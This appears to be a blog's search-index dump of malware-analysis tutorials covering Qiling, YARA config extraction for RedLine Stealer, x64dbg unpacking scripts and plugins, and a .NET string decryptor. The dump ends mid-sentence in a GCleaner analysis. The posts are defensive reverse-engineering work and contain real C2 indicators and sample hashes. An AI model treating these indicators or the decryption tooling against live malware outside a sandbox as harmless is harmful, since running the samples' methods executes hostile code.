[+] Done with loading qiling/examples/rootfs/x8664_windows/Windows/System32/kernel32.dll [*] Import: GetProcAddress [*] Import: LoadLibraryA [*] Import: GetProcessImageFileNameW [*] Import: GetForegroundWindow [*] Import: GetWindowThreadProcessId [*] Import: GetWindowTextW [*] Import: GetKeyboardState ...........   Perfect! Knowing the imports of a malware sample can help in profiling it, BTW this malware is a keylogger.   Decrypting QBot Strings   It’s common to see malware encrypting its strings to make the analysis process more challenging.   Recently I was analyzing QBot which implements this same technique and it only decrypts required strings on demand.   In my analysis, I reverse engineered the decryption routine as it was simple. But imagine if it was a complicated algorithm with lots of mathematical operations and obfuscated instructions, that’s where Qiling comes in handy.      As you can see, the decryption function takes one argument in EAX which is an index and the returns the required string decrypted.      We can combine the power of Qiling and IDAPython to decrypt the strings and add them as IDA comments.   First we need to get all cross references to the decryption function and then extract the index (second operand) from the previous instruction (as shown above).   # start/end of the decryption function DEC_START = 0x4065B7 DEC_END   = 0x406655  # xrefs to the decryption function xrefs = idautils.CodeRefsTo(DEC_START, 0) # indexes of requested strings to decrypt indexes = {}  for x in xrefs:     # address of previous instruction where \"eax\" is set     ea = idc.prev_head(x)     # type of the second operand of \"mov\"     t = idc.get_operand_type(ea, 1)     # check if the second operand is an immediate (not dynamic value)     if t == idc.o_imm:         # get the index value (second operand)         idx = idc.get_operand_value(ea, 1)         indexes[ea] = idx   Next we initialize Qiling emulator object and loop through collected indexes. At each iteration we set EAX to the index value and run the decryption function.   Finally we read the decrypted string from EAX (return value) and set it as IDA comment.   # initialize emulator (x86 windows) ql = Qiling([\"qbot.exe\"], rootfs=\"qiling/examples/rootfs/x86_windows\")  # loop through collected indexes for ea, idx in indexes.items():     # set function parameter @eax     ql.reg.eax = idx     # run decryption function     ql.run(begin=0x4065B7, end=0x406654)     # set decrypted string as ida comment     idc.set_cmt(ea, readString(ql, ql.reg.eax), 1)   Reading a string from memory address is simply reading bytes one by one until we reach a null byte.   # read string from memory address def readString(ql, addr):     res = \"\"     while True:         # read one byte at a time         c = ql.mem.read(addr, 1).decode()         if c == '\\x00':             break         res += c         addr += 1     return res   Let’s see the results:      Viola! we managed to decrypt most of the strings without reversing the decryption function.   Conclusion   Qiling is a great project for malware analysis and binary emulation. Although it’s still new but it has lots of capabilities and a lot more to come.   Code snippets can be found on my Github.   Don’t forget to star the Project to support the devs :)  ","categories": ["Tutorials"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/tutorials/qiling-for-malware-analysis-part-2/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/tutorials/qiling/logo.png"
      },{
        "title": "YARA for config extraction",
        "excerpt":"YARA is a tool aimed at helping malware researchers to identify and classify malware samples. It’s considered to be the pattern matching swiss knife for malware researchers.   If you are not familiar with writing YARA rules, the official docs would be a great start.   In this blog I will go through how YARA rules can be used for malware config extraction.   YARA has come a long way since its original release and it now has some awesome modules for writing better and more complex rules.   What is a YARA module   A YARA module is like a plugin for extending YARA features, it allows you to define data structures and functions which can be used in your rules.   To use a YARA module you simply import it using import \"module_name\", you can refer to the docs to learn about the available functions of each module.   Example:   import \"pe\"  rule test {     condition:         pe.number_of_sections == 1 }   With that said let’s now jump into malware land, I will demonstrate on two variants of RedLine Stealer which is a very popular dotnet stealer.   RedLine Stealer Variant1   The first variant stores the config in plaintext, we are only interested in two fields (C2 and BotnetID).      To read these fields we need to understand how ldstr instruction works. The instruction’s opcode is 0x72 followed by 4 bytes which represent the string token.      A token is a DWORD value that represents a table and an index into that table. For example, the EntryPointToken 0x0600002C, references table 0x06 (MethodDef) and its row 0x2C. The table index is 1 byte and the row index is 3 bytes.    In the following instruction for example, the string token is 0x7000067B (little-endian) and the row index is 0x67B.   727B060070   // ldstr \"87.251.71.4:80\"   The dotnet module already has the functionality to retrieve all user strings from a dotnet sample.   import \"dotnet\" import \"console\"  rule Test {     condition:         for all i in (0..dotnet.number_of_user_strings-1): (             console.log(dotnet.user_strings[i])         ) }         Notice that I used sed to remove null characters because dotnet user strings are stored as an array of unicode strings.     This is cool but we need to get the user strings using the row index from the string token.   To achieve this we need to make a couple of changes to the dotnet module source file at libyara/modules/dotnet/dotnet.c.         This will index the user strings array by row index (offset from the start of the strings table).   To compile and install yara you need to run these two scripts for the first time only:   $ ./bootstrap.sh $ ./configure   Then you build YARA with your changes:   $ make $ sudo make install   We can now write a simple rule to read the config fields.   import \"dotnet\" import \"console\"  rule Redline {     strings:         $get_conf_v1 = {             72 ?? ?? ?? 70      // IL_0000: ldstr     \"87.251.71.4:80\"             80 ?? ?? ?? 04      // IL_0005: stsfld    &lt;IP&gt;             72 ?? ?? ?? 70      // IL_000A: ldstr     \"lyla\"             80 ?? ?? ?? 04      // IL_000F: stsfld    &lt;ID&gt;             72 ?? ?? ?? 70      // IL_0014: ldstr     \"\"             28 ?? ?? ?? ??      // IL_0019: call      set_Message(string)             2A                  // IL_001E: ret         }      condition:         $get_conf_v1         and console.log(\"[+] C2: \",             dotnet.user_strings[int32(@get_conf_v1+1) &amp; 0xffffff]         )         and console.log(\"[+] Botnet: \",             dotnet.user_strings[int32(@get_conf_v1+11) &amp; 0xffffff]         ) }           @get_conf_v1: address of the first match of $get_conf_v1     int32: reads 4 bytes (string token) from an offset, I used 0xffffff bit mask to only get the row index.         Cool, Let’s move to the second variant.   RedLine Stealer Variant2   This variant stores the config in an encrypted form.      The decryption algorithm looks as follows:      Currently YARA doesn’t have a module to do base64 and xor operations in conditions, so why not write our own module :)   Writing our own YARA module   Modules are written in C and built into YARA as part of the compiling process.   I will explain briefly how to write a YARA module, for more details refer to the official docs.   YARA modules reside in libyara/modules, it’s recommended to use the module name as the file name for the source file. Here I created a new module directory named malutils and inside it is the source file named malutils.c, now let’s go through the source code.   First we need to include the required headers to be able to use YARA’s module API.      Next we define the required functions:      Xor decryption function which takes a buffer and a key and returns the decrypted string buffer.         Base64 decoding function which takes a base64 encoded string and returns the decoded value.         Helper function to convert dotnet user strings from wide to ascii.      Then comes the declaration section where we declare the functions and data structures that will be available for our YARA rules.      After that we have 2 pairs of functions, the first pair is module_initialize &amp; module_finalize.   These functions allow you to initialize and finalize any global data structure you may need to use in your module, and both functions are invoked whether or not the module is being imported by some rule.      The second pair is module_load &amp; module_unload.   The module_load function is invoked once for each scanned file (only if the module is imported in your rule). It’s is where your module can inspect the file being scanned, parse or analyze it in the way preferred, and then populate the data structures defined in the declarations section.   For each call to module_load there is a corresponding call to module_unload. This function allows your module to free any resource allocated during module_load.      Final Touches   Before we test our module there’s a nasty bug we need to take care of.   When writing a YARA module, instead of using the C return statement in your declared functions you must use return_string(x), return_integer(x) or return_float(x) to return from a function.   The problem occurs when we return from base64d function, the decoded string might contain null bytes so return_string won’t return the full buffer.   As you can see below, return_string uses strlen to determine the length of the returned string so it will stop at the first null byte.      As a workaround, I defined a new return macro called return_sized_string which enables us to set the length of the returned string rather than relying on strlen.      Building our module   To include our module in the compiling process of YARA we must follow two further steps:      Add our module name to the module_list at libyara/modules/module_list   MODULE(malutils)      Add our module source file to the must compiled modules at libyara/Makefile.am   MODULES += modules/malutils/malutils.c   Finally we build YARA with our module:   $ make $ sudo make install   With everything in place, let’s now test our module.   Testing our module   Below is the final YARA rule that handles both RedLine variants.   import \"dotnet\" import \"console\" import \"malutils\"  rule Redline {     meta:         date = \"2022-08-08\"         author = \"Abdallah 'n1ghtw0lf' Elshinbary\"         description = \"Extracts Redline config (educational)\"      strings:         $get_conf_v1 = {             72 ?? ?? ?? 70      // IL_0000: ldstr     \"87.251.71.4:80\"             80 ?? ?? ?? 04      // IL_0005: stsfld    &lt;IP&gt;             72 ?? ?? ?? 70      // IL_000A: ldstr     \"lyla\"             80 ?? ?? ?? 04      // IL_000F: stsfld    &lt;ID&gt;             72 ?? ?? ?? 70      // IL_0014: ldstr     \"\"             28 ?? ?? ?? ??      // IL_0019: call      set_Message(string)             2A                  // IL_001E: ret         }         $get_conf_v2 = {             72 ?? ?? ?? 70      // IL_0000: ldstr     \"CyYOXysPAwUnB1NQCxtdWioxKUInBC5QCDNUUw==\"             80 ?? ?? ?? 04      // IL_0005: stsfld    &lt;IP&gt;             72 ?? ?? ?? 70      // IL_000A: ldstr     \"FzcNJDEOEDw7O1Y/FEM/IQ==\"             80 ?? ?? ?? 04      // IL_000F: stsfld    &lt;ID&gt;             72 ?? ?? ?? 70      // IL_0014: ldstr     \"\"             80 ?? ?? ?? 04      // IL_0019: stsfld    &lt;Message&gt;             72 ?? ?? ?? 70      // IL_001E: ldstr     \"Baying\"             80 ?? ?? ?? 04      // IL_0023: stsfld    &lt;Key&gt;         }      condition:         dotnet.is_dotnet and         (           (             $get_conf_v1             and console.log(\"[+] C2: \",               malutils.wtoa(dotnet.user_strings[int32(@get_conf_v1+1) &amp; 0xffffff])             )             and console.log(\"[+] Botnet: \",               malutils.wtoa(dotnet.user_strings[int32(@get_conf_v1+11) &amp; 0xffffff])             )           )           or           (             $get_conf_v2             and console.log(\"[+] C2: \",               malutils.base64d(                 malutils.xord(                   malutils.base64d(                     malutils.wtoa(dotnet.user_strings[int32(@get_conf_v2+1) &amp; 0xffffff])    // enc c2                   ), malutils.wtoa(dotnet.user_strings[int32(@get_conf_v2+31) &amp; 0xffffff])  // xor key                 )               )             )             and console.log(\"[+] Botnet: \",               malutils.base64d(                 malutils.xord(                   malutils.base64d(                     malutils.wtoa(dotnet.user_strings[int32(@get_conf_v2+11) &amp; 0xffffff])   // enc botnet                   ), malutils.wtoa(dotnet.user_strings[int32(@get_conf_v2+31) &amp; 0xffffff])  // xor key                 )               )             )             and console.log(\"[+] Key: \",               malutils.wtoa(dotnet.user_strings[int32(@get_conf_v2+31) &amp; 0xffffff])             )           )         ) }   Running the rule on a list of samples produces the following output:      Beautiful right!   You can pull the code and try it yourself at  https://github.com/N1ght-W0lf/yara/tree/malutils.   It was just for learning purposes so not the best code :)   Samples   fed976b2d134008fd6daec8edc00099935df756beb721034f71db33e4d675a6e e4f7246b103d9bda3a7604bea12dc5ac1064764c0f3691617c9829c4e5d469b5 2d3503d8540e319851a67e55f06ed9e5ba060e821eec6dbc83960a5947ad1310 a8c498f5129af0229081edf1e535ac9dab6ad568befcbcecbfc7cc4c61e0a8eb c19938f0b9648dc1f6b95d0e767164da832b9a92f8128ab47dcb81c5e1ceb31a e94d48e09cace8937941fbf81d1a466fa2b2b6acfd0d6142fc3443c70e067294 f343005539a589ec5512559e0bdc824c1069196ae39d519e5b1f3257f4a6660b   References   https://yara.readthedocs.io/en/stable/index.html   https://www.ntcore.com/files/dotnetformat.htm  ","categories": ["Tutorials"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/tutorials/yara-for-config-extraction/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/tutorials/yara/logo.png"
      },{
        "title": "Writing x64dbg scripts",
        "excerpt":"x64dbg is an open-source x64/x32 debugger for windows, it has dozens of features that make the life of reverse engineers and malware analysts easier.   One of the coolest features of x64dbg is that it’s extendable, it comes with a debuggable scripting language and a software development kit for writing your own plugins.   In this post we will talk about x64dbg scripting and in the next one we will talk about plugins.   Scripts are just a sequence of commands, you can see all the available commands here.   To execute a command you can simply type it in the command prompt and check the result in the Log window.      For this tutorial we will write a simple script to automatically dump unpacked PE payloads in memory.   The unpacking workflow (how I usually do it) is to set a breakpoint at VirtualAlloc and VirtualProtect, run the program and follow the memory allocations in dump waiting for the MZ header to appear then dump that memory region. Let’s use the power of scripting to automate this process.   First we will define two variables to hold the address and size of allocated memory regions using var command.   var mem_addr var mem_size   Next we can set our breakpoints.   bp VirtualAlloc SetBreakpointCommand VirtualAlloc, \"scriptcmd call cb_virtual_alloc\"  bp VirtualProtect SetBreakpointCommand VirtualProtect, \"scriptcmd call cb_virtual_protect\"   We can use SetBreakpointCommand to set a command to execute when the breakpoint is hit.   The command we need here is call which will jump to a callback function defined by a label, we also have to use scriptcmd to execute the call in the context of a running script (not in the context of the debugging loop).   cb_virtual_alloc:     rtr     set mem_addr, cax     log \"Allocated memory address: {x:mem_addr}\"     set mem_size, arg.get(1)     log \"Allocated memory size: {x:mem_size}\"   When we reach this callback we first need to use rtr command (run till return) to let VirtualAlloc does the memory allocation.   Next we can get the returned memory address stored at eax/rax and store that value in mem_addr variable.   x64dbg provides the following registers: cax , cbx , ccx , cdx , csp , cbp , csi , cdi , cip which are mapped to 32-bit registers on a 32-bit platform, and to 64-bit registers on a 64-bit platform. This gives you the ability to write architecture-independent code, so we will use cax to get the return value.   As all good developers know the best debugging technique is print-based debugging :)   So we can use the log command to print some logging messages.   The log command takes one argument which is a format string, you can read about the string formatter here. We only need the basic syntax which is {?:expression} where ? is the optional type of the expression (x for hex value).   Next we need to get the size of the allocated memory which is passed to VirtualAlloc as the second argument.   To get an argument at a given index we can use the expression function arg.get(index) which gets the argument at a given index (zero-based). Note that you should be inside the function boundaries to get the correct value.   With that done let’s define the next callback.   cb_virtual_protect:     log \"New protection: {x:arg.get(2)}\"     cmp word(mem_addr), 5a4d     jne main     savedata :memdump:, mem_addr, mem_size   First we log the third argument of VirtualProtect which is the new memory protection, this can be used to check for protection changes which might indicate unpacking but we won’t use it here.   Next we use another expression function word to read the first 2 bytes from the previously allocated memory address and compare them to 0x5a4d (the MZ header). Note that all numbers are interpreted as hex by default.   If the check is false we jump to the main label and continue execution, if not we save that memory region to disk.   The first argument of savedata command is the filename, if we use :memdump: as a name it will save the file as memdump_pid_addr_size.bin in the x64dbg directory.   Finally we use run command to run the program and watch the magic happen. you can use Tab to step into the script or Space to run the script.     Simple as that.   Full script:   // define a variable to hold allocated mem address var mem_addr // define a variable to hold allocated mem size var mem_size  // set breakpoint on VirtualAlloc bp VirtualAlloc // set callback on breakpoint hit SetBreakpointCommand VirtualAlloc, \"scriptcmd call cb_virtual_alloc\" // set breakpoint on VirtualProtect bp VirtualProtect // set callback on breakpoint hit SetBreakpointCommand VirtualProtect, \"scriptcmd call cb_virtual_protect\"  // go to main label goto main  // define VirtualAlloc callback label cb_virtual_alloc:     // run until return (stepout)     rtr     // set mem_addr value to cax value (return value)     set mem_addr, cax     // log memory address     log \"Allocated memory address: {x:mem_addr}\"     // set mem_size value to VirtualAlloc's second arg value (region size)     set mem_size, arg.get(1)     // log memory size     log \"Allocated memory size: {x:mem_size}\"     // go to main label     goto main  // define VirtualProtect callback label cb_virtual_protect:     // log VirtualProtect's second arg value (new protection)     log \"New protection: {x:arg.get(2)}\"     // compare the first 2 bytes at mem_addr address to \"MZ\"     cmp word(mem_addr), 5a4d     // if not equal, jump to main label     jne main     // dump data at mem_addr address to disk     savedata :memdump:, mem_addr, mem_size  // define main label main:     // run the program     run  // end the script ret  ","categories": ["Tutorials"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/tutorials/writing-x64dbg-scripts/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/tutorials/x64dbg/scripting/logo.png"
      },{
        "title": "Writing x64dbg plugins",
        "excerpt":"In the previous post we talked about writing x64dbg scripts, now let’s dive deeper and write our own plugin to do the same job (automatically dumping unpacked PE payloads in memory).   x64dbg comes with an integrated plugin SDK for creating plugins using C++.   Setup   The easiest way to create a plugin is to use the PluginTemplate to create a new repository for your plugin.   Next you can edit cmake.toml which contains the project configuration, for this tutorial we will only change the name and target values to our plugin name.   name = \"EasyDump\" .... [target.EasyDump]   To build the project for 64-bit –&gt; build64\\ProjectName.sln   cmake -B build64 -A x64 cmake --build build64 --config Release   To build the project for 32-bit –&gt; build32\\ProjectName.sln   cmake -B build32 -A Win32 cmake --build build32 --config Release   Plugin structure   A plugin must have an exported function called pluginit, this is the first function that gets called when the plugin is loaded and where the plugin data is initialized.   Other optional exports are:      plugstop:   called when the plugin is about to be unloaded and where the plugin data cleanup occurs.           plugsetup:       called when the plugin initialization was successful, here you can register menus and other GUI-related things.       SDK functions   Before we go any further we need to know what functions exported by the plugin SDK we can use, you can find some of these functions in the official docs but many of them are not documented.   To view the full list you can explore the SDK header files.      For me plugin SDK functions are divided into 4 main categories:           _plugin_ functions @_plugins.h:       Helper functions for plugin setup, initialization and logging.            bridge functions @bridgemain.h:       Bridge is the communication library for the DBG and GUI part of x64dbg.            scriptapi functions @_scriptapi_*.h:       It is intended to be used by plugins. It provides easy scripting experience for developers.            TitanEngine functions @TitanEngine.h:       Titan is the debugging engine for x64dbg.       Most functions are self explanatory or documented in the official docs, for TitanEngine functions you can find its docs here or you can check the markdown version for better readability I uploaded here.   Ok enough talk let’s get our hands dirty.   Implementation   Your code should go into plugin.cpp file, let’s start with the plugin main components.   // Initialize your plugin data here. bool pluginInit(PLUG_INITSTRUCT* initStruct) {     _plugin_logputs(\"[\" PLUGIN_NAME \"] Loaded successfully!\");      if (!_plugin_registercommand(pluginHandle, \"EasyDump\", cbEasyDump, true))         return fail(\"Failed to register command\");      return true; // Return false to cancel loading the plugin. }  // Deinitialize your plugin data here. void pluginStop() {     _plugin_unregistercommand(pluginHandle, \"EasyDump\"); }   First we need to register a command that we can use in the command prompt using _plugin_registercommand function, The definition for this function is:   bool _plugin_registercommand( \tint pluginHandle,          // Plugin handle \tconst char* command,       // Command name \tCBPLUGINCOMMAND cbCommand, // Callback function \tbool debugonly             // Restrict the command to debug-only );   And of course don’t forget to unregister this command inside pluginStop using _plugin_unregistercommand.   Now let’s implement the callback function.   static bool cbEasyDump(int argc, char* argv[]) {     // Delete All BPs     DbgCmdExec(\"bpc\");      // Set BP on VirtualAlloc ret     if (!SetAPIBreakPoint(\"kernelbase.dll\", \"VirtualAlloc\", UE_BREAKPOINT, UE_APIEND, cbVirtualAlloc))         fail(\"Failed to set a Breakpoint on VirtualAlloc\");      // Set BP on VirtualProtect start     if (!SetAPIBreakPoint(\"kernelbase.dll\", \"VirtualProtect\", UE_BREAKPOINT, UE_APISTART, cbVirtualProtect))         fail(\"Failed to set a Breakpoint on VirtualProtect\");      _plugin_logprint(\"[\" PLUGIN_NAME \"] Starting the program...\\n\");     DbgCmdExec(\"run\");      return true; }   Callback arguments are passed in argv starting at index 1, but our command doesn’t need any arguments.   We will start with deleting all breakpoints to let the plugin run without interruption using DbgCmdExec to execute bpc command (breakpoint clear).   Next we set our breakpoints using SetAPIBreakPoint function which is defined as:   bool __stdcall SetAPIBreakPoint(     char* szDLLName,   // DLL name     char* szAPIName,   // API name     DWORD bpxType,     // UE_BREAKPOINT or UE_SINGLESHOOT     DWORD bpxPlace,    // UE_APISTART or UE_APIEND     LPVOID bpxCallBack // Callback function );   For VirtualAlloc we need to set the breakpoint at return so we will use UE_APIEND as the bpxPlace value.   Next we do some logging and run the program.   // VirtualAlloc BP callback static void cbVirtualAlloc() {     mem_addr = Script::Register::GetCAX();     // auto x = GetFunctionParameter(DbgGetProcessHandle(), UE_FUNCTION_STDCALL_RET, 2, UE_PARAMETER_DWORD);     mem_size = DbgEval(\"arg.get(1)\");      _plugin_logprintf(\"[\" PLUGIN_NAME \"] VirtualAlloc addr: %x\\n\", mem_addr);     _plugin_logprintf(\"[\" PLUGIN_NAME \"] VirtualAlloc size: %x\\n\", mem_size); }   When reach the VirtualAlloc callback the allocated memory address would be stored at EAX/RAX, we can use the scriptapi register function GetCAX to read this value (remember x64dbg provides special registers for architecture-independent code).   To get the memory size stored at the second argument we can use DbgEval to evaluate arg.get(1) command and get its result.   // VirtualProtect BP callback static void cbVirtualProtect() {     auto header = Script::Memory::ReadWord(mem_addr);     // Check for MZ header     if (header == 0x5a4d) {         _plugin_logprintf(\"[\" PLUGIN_NAME \"] Found a PE file at addr: %x\\n\", mem_addr);          // Build dumping path         char path[MAX_PATH];         Script::Module::GetMainModulePath(path);         sprintf(path, \"%s\\\\memdump_%X_%zx_%zx.bin\", getParentPath(path), DbgGetProcessId(), mem_addr, mem_size);          // Dump payload to disk         if (DumpMemory(DbgGetProcessHandle(), (LPVOID)mem_addr, mem_size, path))             _plugin_logprintf(\"[\" PLUGIN_NAME \"] Dumped payload at %s\\n\", path);         else             fail(\"Failed to dump the payload\");     } }   When we hit VirtualProtect we can read the first 2 bytes from the allocated memory address to check for the MZ header.   To build a dumping path similar to :memdump: from savedata command we need to get the current module path using GetMainModulePath, get the current process ID using DbgGetProcessId and append the memory address and size to them.   Finally to dump the payload to disk we can use DumpMemory passing it the current process handle using DbgGetProcessHandle, memory address, memory size and file path.   Trying our plugin   After building the plugin we need to move the plugin files which end with .dp32 or .dp64 depending on the build configuration to x64dbg\\release\\(x32|x64)\\plugins.   To load the the plugin we can restart x64dbg and it will be loaded automatically or just use loadplugin command passing it the plugin name like this loadplugin EasyDump.   Finally we can run EasyDump (the command we registered in pluginInit) and watch the magic happen…again.      source code: https://github.com/N1ght-W0lf/EasyDump   Updates      Some notes from Duncan Ogilvie @mrexodia     As a general rule I’d avoid using the TitanEngine APIs directly. They can cause some weird scenarios where x64dbg doesn’t know about a breakpoint for example. Unfortunately the plugin API isn’t very strong on this front though, so it’s a lot more work to do the same…     Also something worth exploring is the C# scripting plugin: https://github.com/x64dbg/DotX64Dbg     And confusingly DbgCmdExec (queues a command asynchronously) causes a race condition in your example. Likely you want DbgCmdExecDirect instead (executed the implementation of the command directly)    Final words   The goal of this tutorial was to learn more about x64dbg not write the best dumping plugin :)   This tutorial wouldn’t be possible without the help of the official x64dbg docs and blog, you can check them out for more in depth info.   You can also find many cool x64dbg plugins here that can make your life easier.   Special thanks to @mrexodia (creator of x64dbg and many other projects) for his awesome work, you can support him here.   I hope you learned something new, until next time.  ","categories": ["Tutorials"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/tutorials/writing-x64dbg-plugins/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/tutorials/x64dbg/plugins/logo.png"
      },{
        "title": "Dotnet String Decryptor",
        "excerpt":"Welcome back! This is a short blog post about reverse engineering dotnet malware.   When working with dotnet malware samples I always come around samples with obfuscated strings which makes analysis harder.   My go to way to handle this situation was to identify the string decryption routine (through static/dynamic analysis) then use de4dot to decrypt the strings.   But sometimes you don’t want to go through every sample and find the decryption routine or you need to automate this process for a collection of different samples.   While looking around for a solution I found this cool blog, so I will be building on it to write a generic dotnet string decryptor which will hopefully make life a bit easier.   We will be working on an obfuscated sample of DCRat to test our script. c6244c8e4e4cdecd641017d52d344b1db6a23d05fd6a8ad338c8f4f77481f483   Writing the deobfuscation script   Step 1 : Importing libs and loading the .NET file   We first need to install pythonnet which allows CLR namespaces to be treated essentially as python packages.   pip install pythonnet   Then we can import the required reflection modules which we will use later to get and invoke decryption methods.   import clr from System.Reflection import Assembly, BindingFlags, MethodInfo   We also need to add a reference to dnlib.dll which we will use to parse the .NET assemblies and modules.   clr.AddReference(\"./dnlib\")  import dnlib from dnlib.DotNet import ModuleDef, ModuleDefMD from dnlib.DotNet.Emit import OpCodes from dnlib.DotNet.Writer import ModuleWriterOptions   Now we can load our .NET file.   file_module = ModuleDefMD.Load(file_path) file_assembly = Assembly.LoadFile(file_path)   Step 2 : Finding suspected decryption methods   Before we get any further we need to define the signatures of the suspected methods that are used for string decryption.   A method signature consists of the type of its parameters and its return type.   Below is the string decryption method in the sample we are working on:      I also found some wrapper methods that call the decryption method and they had a different signature.      So we can define our suspected method signatures as follows:   DECRYPTION_METHOD_SIGNATURES = [     {         \"Parameters\": [\"System.Int32\"],         \"ReturnType\": \"System.String\"     },     {         \"Parameters\": [\"System.Int32\"],         \"ReturnType\": \"System.Object\"     }, ]   Of course there could be other methods with similar signatures which are not related to string decryption, but invoking them shouldn’t affect the end result (and you better run the script in a sandboxed environment).   Next we use the reflection modules to loop through the methods of each Type (classes, interfaces, …) and find suspected methods based on the list of signatures we defined above.   # Search for static, public and non public members eFlags = BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic  for module_type in file_assembly.GetTypes():     for method in module_type.GetMethods(eFlags):   If we find a suspected method we need to store its corresponding signature and MethodInfo object which we will use later to invoke that method.           # Check if the current method has a suspected signature         for sig in StringDecryptor.DECRYPTION_METHOD_SIGNATURES:             # Check number of parameters and return type             parameters = method.GetParameters()             if ((len(parameters) == len(sig[\"Parameters\"])) and                 (method.ReturnType.FullName == sig[\"ReturnType\"])):                                 # Check parameters types                 param_types_match = True                 for i in range(len(parameters)):                     if parameters[i].ParameterType.FullName != sig[\"Parameters\"][i]:                         param_types_match = False                         break                  if param_types_match:                     # Store the signature and MethodInfo object of the current method                     method_name = f\"{method.DeclaringType.FullName}::{method.Name}\"                     suspected_methods[method_name] = (sig, method)   Step 3 : Finding references to suspected methods   The next step is to find references to the suspected methods so we can get the required parameters.   To do this we can use dnlib modules to loop through the CIL instructions of each method and find calls to these methods.   for module_type in file_module.Types:     if not module_type.HasMethods:         continue      for method in module_type.Methods:         if not method.HasBody:             continue          # Loop through method instructions         for insnIdx, insn in enumerate(method.Body.Instructions):             # Find Call instructions             if insn.OpCode == OpCodes.Call:                 for s_method_name, (s_method_sig, s_method_info) in suspected_methods.items():                     # Check if the callee is one of the suspected methods                     if str(s_method_name) in str(insn.Operand):   If we find a reference call, we need to get the required parameters (note that they are pushed to the stack in reverse order).                                   # Get method parameters in reverse order                                 params = []                                 for i in range(len(s_method_sig[\"Parameters\"])):                                     operand = GetOperandValue(                                         method.Body.Instructions[insnIdx - i - 1],                                         s_method_sig[\"Parameters\"][-i - 1])                                     if operand is not None:                                         params.append(operand)                                  # Check if we got all the parameters                                 if len(params) == len(s_method_sig[\"Parameters\"]):   Next we can invoke suspected methods to get the decrypted strings                                       # Invoke suspected method                                     try:                                         result = str(s_method_info.Invoke(None, params[::-1]))                                     except Exception as e:                                         continue   Step 4 : Patching   If the method invoke succeeded we can safely patch the method parameters with NOPs and patch the method call itself with the decrypted string.                                       # Patch suspected method parameters with NOPs                                     for i in range(len(s_method_sig[\"Parameters\"])):                                         method.Body.Instructions[insnIdx - i - 1].OpCode = OpCodes.Nop                                      # Patch suspected method call with the result string                                     method.Body.Instructions[insnIdx].OpCode = OpCodes.Ldstr                                     method.Body.Instructions[insnIdx].Operand = result                                     decrypted_strings.append(result)   Step 5 : Saving   Finally we can save the deobfuscated file to disk.   # Add writer options to ignore dnlib errors options = ModuleWriterOptions(file_module) options.Logger = dnlib.DotNet.DummyLogger.NoThrowInstance  # Write cleaned module content file_module.Write(\"out.bin\", options)   Testing and final notes   Let’s run the script on the sample we have and see the results.                                    Perfect, now it’s much easier to work on the sample and analyze its functionalities.   A little something before we wrap up, you can check if a PE is a dotnet file by checking the existence of the IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR data directory (at index 14).   dotnet_dir = pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR'] # COM descriptor table index if pe.OPTIONAL_HEADER.DATA_DIRECTORY[dotnet_dir].VirtualAddress == 0:     sys.exit(\"[-] File is not .NET\")   The full code can be found here.   Until next time, cheers!  ","categories": ["Tutorials"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/tutorials/dotnet-string-decryptor/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/tutorials/dotnet/logo.png"
      },{
        "title": "Deep Analysis of GCleaner",
        "excerpt":"Howdy! I’m finally back with another malware deep dive report. This time we are digging into GCleaner.   GCleaner is a Pay-Per-Install (PPI) loader first discovered in early 2019, it has been used to deploy other malicious families like Smokeloader, Amadey, Redline and Raccoon.   We will be working on this sample:   (SHA256: 020d370b51711b0814901d7cc32d8251affcc3506b9b4c15db659f3dbb6a2e6b)   Initial Triage   Let’s start by running the sample in Triage sandbox to get an overview of what it does.   We can see from the process tree that it drops and runs another binary out of \"%APPDATA%\" folder with a seemingly random name then it kills itself using \"taskkill\" and deletes the sample binary from disk.      The network tab shows communications to different IP addresses which are considered as C2 servers in Triage’s malware config tab. Each C2 has a different URL path, we will dig deeper to find out what each of them is responsible for.      Right when we open the sample in IDA we don’t have much to look at, there are some interesting strings and API imports but not very helpful to start with.   We can see a repeated pattern across the code where some values are pushed into the stack then xored with 0x2E, so we first need to decrypt these values.      String Decryption   Automating the decryption for stack strings in this sample can be a bit tricky, luckily I noticed a specific instruction that occurs after loading the encrypted strings into stack (cmp      eax, [reg+4]).      So we can find all occurrences of this instruction then walk back to find the mov instructions and get the encrypted values. Let’s apply this to an IDA python script.   # Lowest address used in the program addr = idc.get_inf_attr(INF_MIN_EA)  while True:     # Search for \"cmp eax, [reg+4]\"     addr = ida_search.find_binary(addr, idc.BADADDR, \"3B ?? 04 00 00 00\", 16, ida_search.SEARCH_NEXT | ida_search.SEARCH_DOWN)     if addr == idc.BADADDR:         break      enc_bytes = b''     # Search for possible stack strings in the previous 12 instructions     for i in range(12):         ea = idc.prev_head(ea)         if (idc.print_insn_mnem(ea) == \"mov\" and             idc.get_operand_type(ea, 0) == idc.o_displ and             idc.get_operand_type(ea, 1) == idc.o_imm):             # Get the value of the second operand             operand_value = idc.get_operand_value(ea, 1)   The returned operand value is an integer but we need to store it as a byte array, so we first need to figure out the size of that operand to store it correctly.               # Get the size of the second operand             insn = ida_ua.insn_t()             ida_ua.decode_insn(insn, ea)             operand_size = ida_ua.get_dtype_size(insn.Op2.dtype)                          # Specify the correct data type             if operand_size == 4:                 operand_bytes = struct.pack(\"&lt;I\", operand_value)             elif operand_size == 2:                 operand_bytes = struct.pack(\"&lt;H\", operand_value)             else:                 operand_bytes = struct.pack(\"&lt;B\", operand_value)                              enc_bytes = operand_bytes + enc_bytes   One 